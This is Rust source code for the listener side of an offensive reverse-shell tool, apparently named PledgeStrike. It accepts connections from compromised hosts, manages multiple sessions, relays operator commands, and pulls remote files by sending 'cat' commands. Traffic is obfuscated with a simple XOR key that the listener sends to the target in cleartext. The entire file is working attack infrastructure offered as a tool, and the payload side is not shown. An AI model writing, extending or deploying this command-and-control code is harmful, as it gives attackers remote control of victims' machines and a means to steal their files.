use colored::Colorize;
use std::collections::HashMap;
use std::io::{self, Write};
use std::net::SocketAddr;
use std::sync::Arc;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{Mutex, mpsc};

#[derive(Clone)]
pub struct Session {
    pub id: usize,
    pub remote_addr: String,
    pub connected_at: u64,
    pub encrypted: bool,
    pub key: Vec<u8>,
    pub output: String,
    pub alive: bool,
}

pub struct SessionManager {
    pub sessions: Arc<Mutex<HashMap<usize, mpsc::Sender<SessionCommand>>>>,
    pub session_info: Arc<Mutex<HashMap<usize, Session>>>,
    pub next_id: Arc<Mutex<usize>>,
    pub log_writer: Option<Arc<Mutex<std::fs::File>>>,
}

pub enum SessionCommand {
    Send(String),
    Download {
        remote_path: String,
        local_path: String,
    },
    Upload {
        local_path: String,
        remote_path: String,
    },
    Kill,
}

impl SessionManager {
    pub fn new(log_file: Option<std::fs::File>) -> Self {
        let log_writer = log_file.map(|f| Arc::new(Mutex::new(f)));
        SessionManager {
            sessions: Arc::new(Mutex::new(HashMap::new())),
            session_info: Arc::new(Mutex::new(HashMap::new())),
            next_id: Arc::new(Mutex::new(1)),
            log_writer,
        }
    }

    pub async fn listen(
        &self,
        bind: &str,
        port: u16,
        encrypt: bool,
        key: Option<&str>,
    ) -> anyhow::Result<()> {
        let listener = TcpListener::bind(format!("{}:{}", bind, port)).await?;
        let actual_port = listener.local_addr()?.port();

        println!(
            "{} PledgeStrike Reverse Shell Listener",
            "[*]".cyan().bold()
        );
        println!("{}", "═".repeat(60).cyan());
        println!(
            "{} Listening on {}:{}",
            "[*]".cyan().bold(),
            bind,
            actual_port
        );

        if encrypt {
            let key_display = key.unwrap_or("auto-generated");
            println!(
                "{} Encryption: enabled (key: {})",
                "[*]".cyan().bold(),
                key_display
            );
        } else {
            println!("{} Encryption: disabled", "[*]".cyan().bold());
        }

        println!(
            "{} Waiting for connections... Press Ctrl+C to stop",
            "[*]".cyan().bold()
        );
        println!("{}", "─".repeat(60).dimmed());

        let enc_key = if encrypt {
            match key {
                Some(k) => k.as_bytes().to_vec(),
                None => generate_key(),
            }
        } else {
            Vec::new()
        };

        loop {
            match listener.accept().await {
                Ok((stream, addr)) => {
                    let mut next_id = self.next_id.lock().await;
                    let id = *next_id;
                    *next_id += 1;
                    drop(next_id);

                    let session = Session {
                        id,
                        remote_addr: addr.to_string(),
                        connected_at: SystemTime::now()
                            .duration_since(UNIX_EPOCH)
                            .unwrap()
                            .as_secs(),
                        encrypted: encrypt,
                        key: enc_key.clone(),
                        output: String::new(),
                        alive: true,
                    };

                    println!(
                        "\n{} Session #{} connected from {}",
                        "[+]".green().bold(),
                        id,
                        addr.to_string().red().bold()
                    );

                    if encrypt {
                        println!(
                            "{} Sending encryption key to session #{}",
                            "[*]".cyan().bold(),
                            id
                        );
                    }

                    self.session_info.lock().await.insert(id, session);

                    let (cmd_tx, mut cmd_rx) = mpsc::channel::<SessionCommand>(32);
                    self.sessions.lock().await.insert(id, cmd_tx);

                    let session_info = self.session_info.clone();
                    let log_writer = self.log_writer.clone();
                    let key_clone = enc_key.clone();

                    tokio::spawn(async move {
                        handle_session(
                            stream,
                            id,
                            addr,
                            key_clone,
                            &mut cmd_rx,
                            session_info,
                            log_writer,
                        )
                        .await;
                    });
                }
                Err(e) => {
                    eprintln!("{} Accept error: {}", "[-]".red().bold(), e);
                }
            }
        }
    }

    pub async fn list_sessions(&self) -> Vec<Session> {
        self.session_info.lock().await.values().cloned().collect()
    }

    pub async fn send_command(&self, session_id: usize, cmd: &str) -> anyhow::Result<()> {
        let sessions = self.sessions.lock().await;
        if let Some(tx) = sessions.get(&session_id) {
            tx.send(SessionCommand::Send(cmd.to_string())).await?;
            Ok(())
        } else {
            anyhow::bail!("Session #{} not found", session_id)
        }
    }

    pub async fn kill_session(&self, session_id: usize) -> anyhow::Result<()> {
        let sessions = self.sessions.lock().await;
        if let Some(tx) = sessions.get(&session_id) {
            tx.send(SessionCommand::Kill).await?;
            Ok(())
        } else {
            anyhow::bail!("Session #{} not found", session_id)
        }
    }
}

async fn handle_session(
    stream: TcpStream,
    session_id: usize,
    addr: SocketAddr,
    enc_key: Vec<u8>,
    cmd_rx: &mut mpsc::Receiver<SessionCommand>,
    session_info: Arc<Mutex<HashMap<usize, Session>>>,
    log_writer: Option<Arc<Mutex<std::fs::File>>>,
) {
    let (reader, mut writer) = stream.into_split();
    let mut reader = BufReader::new(reader);

    // If encrypted, send the key first
    if !enc_key.is_empty() {
        let key_msg = format!("__PS_KEY:{}__\n", String::from_utf8_lossy(&enc_key));
        let _ = writer.write_all(key_msg.as_bytes()).await;
        let _ = writer.flush().await;
    }

    // Spawn a task to read output from the shell
    let (output_tx, mut output_rx) = mpsc::channel::<String>(256);
    let reader_key = enc_key.clone();

    tokio::spawn(async move {
        let mut buf = vec![0u8; 4096];
        loop {
            match reader.read(&mut buf).await {
                Ok(0) => break,
                Ok(n) => {
                    let data = if !reader_key.is_empty() {
                        xor_decrypt(&buf[..n], &reader_key)
                    } else {
                        buf[..n].to_vec()
                    };
                    let text = String::from_utf8_lossy(&data).to_string();
                    let _ = output_tx.send(text).await;
                }
                Err(_) => break,
            }
        }
    });

    // Main loop: handle commands and output
    loop {
        tokio::select! {
            // Receive output from shell
            Some(output) = output_rx.recv() => {
                print!("{}", output);
                io::stdout().flush().ok();

                // Update session info
                if let Some(session) = session_info.lock().await.get_mut(&session_id) {
                    session.output.push_str(&output);
                }

                // Log to file
                if let Some(writer) = &log_writer {
                    let mut w = writer.lock().await;
                    let _ = writeln!(w, "[Session #{} {}] {}", session_id, addr, output);
                    let _ = w.flush();
                }
            }
            // Receive commands from manager
            Some(cmd) = cmd_rx.recv() => {
                match cmd {
                    SessionCommand::Send(text) => {
                        let data = if !enc_key.is_empty() {
                            xor_encrypt(text.as_bytes(), &enc_key)
                        } else {
                            text.as_bytes().to_vec()
                        };
                        if writer.write_all(&data).await.is_err() {
                            break;
                        }
                        let _ = writer.flush().await;
                    }
                    SessionCommand::Download { remote_path, local_path } => {
                        let cmd = format!("cat {}\n", remote_path);
                        let data = if !enc_key.is_empty() {
                            xor_encrypt(cmd.as_bytes(), &enc_key)
                        } else {
                            cmd.as_bytes().to_vec()
                        };
                        let _ = writer.write_all(&data).await;
                        let _ = writer.flush().await;
                        eprintln!("{} Downloading {} -> {}", "[*]".cyan().bold(), remote_path, local_path);
                    }
                    SessionCommand::Upload { local_path: _, remote_path: _ } => {
                        eprintln!("{} Upload not yet implemented in this mode", "[-]".yellow().bold());
                    }
                    SessionCommand::Kill => {
                        let _ = writer.write_all(b"exit\n").await;
                        let _ = writer.flush().await;
                        break;
                    }
                }
            }
        }
    }

    // Mark session as dead
    if let Some(session) = session_info.lock().await.get_mut(&session_id) {
        session.alive = false;
    }

    println!(
        "\n{} Session #{} disconnected",
        "[-]".red().bold(),
        session_id
    );
}

fn generate_key() -> Vec<u8> {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    (0..16).map(|_| rng.r#gen::<u8>()).collect()
}

fn xor_encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    xor_encrypt(data, key) // XOR is symmetric
}
